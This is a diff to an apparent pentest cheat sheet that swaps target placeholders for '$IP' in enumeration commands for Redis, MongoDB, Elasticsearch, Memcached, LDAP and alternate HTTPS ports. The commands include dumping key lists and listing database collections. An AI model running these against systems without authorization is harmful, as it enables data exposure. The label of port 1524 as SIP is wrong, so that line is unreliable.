 - **8443/TCP - HTTPS Alternate** (info disclosure, SSL misconfig, RCE via web vulns):  
-  `curl -k -I https://<target>:8443` (pre-installed).  
-  `sslscan <target>:8443` (pre-installed).  
-  `nmap -sV --script=ssl-enum-ciphers <target> -p8443` (pre-installed).  
-  `testssl.sh <target>:8443` (pre-installed).  
+  `curl -k -I https://$IP:8443` (pre-installed).  
+  `sslscan $IP:8443` (pre-installed).  
+  `nmap -sV --script=ssl-enum-ciphers $IP -p8443` (pre-installed).  
+  `testssl.sh $IP:8443` (pre-installed).  
 
 - **27017/TCP - MongoDB** (info disclosure, unauthorized access, database dumping):  
-  `mongo --host <target>` (pre-installed).  
-  `nmap -sV --script=mongodb-info <target> -p27017` (pre-installed).  
-  `mongo --host <target> --eval "db.getCollectionNames()"` (db enum; pre-installed).
+  `mongo --host $IP` (pre-installed).  
+  `nmap -sV --script=mongodb-info $IP -p27017` (pre-installed).  
+  `mongo --host $IP --eval "db.getCollectionNames()"` (db enum; pre-installed).
 
 - **9200/TCP - Elasticsearch** (info disclosure, unauthorized access, data extraction):  
-  `curl http://<target>:9200/_cat/indices` (pre-installed).  
-  `nmap -sV --script=http-elasticsearch <target> -p9200` (pre-installed).  
-  `curl http://<target>:9200/_nodes` (node info; pre-installed).
+  `curl http://$IP:9200/_cat/indices` (pre-installed).  
+  `nmap -sV --script=http-elasticsearch $IP -p9200` (pre-installed).  
+  `curl http://$IP:9200/_nodes` (node info; pre-installed).
 
 - **11211/TCP - Memcached** (info disclosure, unauthorized access, cache dumping):  
-  `nc <target> 11211` (stats/version; pre-installed).  
-  `nmap -sV --script=memcached-info <target> -p11211` (pre-installed).  
-  `memcstat --servers=<target>` (stats; install via `apt install libmemcached-tools`).
+  `nc $IP 11211` (stats/version; pre-installed).  
+  `nmap -sV --script=memcached-info $IP -p11211` (pre-installed).  
+  `memcstat --servers=$IP` (stats; install via `apt install libmemcached-tools`).
 
 - **6379/TCP - Redis** (info disclosure, unauthorized access, key dumping):  
-  `redis-cli -h <target> INFO` (pre-installed).  
-  `nmap -sV --script=redis-info <target> -p6379` (pre-installed).  
-  `redis-cli -h <target> --scan --pattern "*"` (key scan; pre-installed).  
-  `redis-cli -h <target> ping` (basic check).
+  `redis-cli -h $IP INFO` (pre-installed).  
+  `nmap -sV --script=redis-info $IP -p6379` (pre-installed).  
+  `redis-cli -h $IP --scan --pattern "*"` (key scan; pre-installed).  
+  `redis-cli -h $IP ping` (basic check).
 
 - **445/TCP - CIFS** (info disclosure, share enumeration, file access):  
   Extension of SMB; same tools as 445 above.
 
 - **3268/TCP - LDAP GC** (info disclosure, user enumeration, global AD details):  
   `View NetExec Notes for enumeration
-  `ldapsearch -x -H ldap://<target>:3268` (pre-installed).  
-  `nmap -sV --script=ldap-rootdse <target> -p3268` (pre-installed).
+  `ldapsearch -x -H ldap://$IP:3268` (pre-installed).  
+  `nmap -sV --script=ldap-rootdse $IP -p3268` (pre-installed).
 
 - **3269/TCP - LDAPS GC** (info disclosure, secure user enumeration, global AD details):  
-  Similar to 636; `ldapsearch -x -H ldaps://<target>:3269` (pre-installed).
+  Similar to 636; `ldapsearch -x -H ldaps://$IP:3269` (pre-installed).
 
 - **1524/TCP - SIP** (info disclosure, VoIP enum, extension brute):  
   `sipvicious` (VoIP enum; install via `apt install sipvicious`).  
